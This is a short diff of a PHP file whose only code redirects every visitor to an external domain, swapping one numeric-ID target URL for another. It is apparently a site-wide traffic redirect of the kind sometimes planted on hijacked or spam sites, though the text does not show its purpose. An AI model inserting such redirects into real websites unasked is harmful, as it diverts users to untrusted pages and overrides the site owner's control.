@@ -1,3 +1,4 @@
 <?php 
-header("Location: http://www.sosoyun.cn/?i=31999"); exit();
+header("Location: http://www.mixici.com/?i=31999"); exit();
 ?>
+	
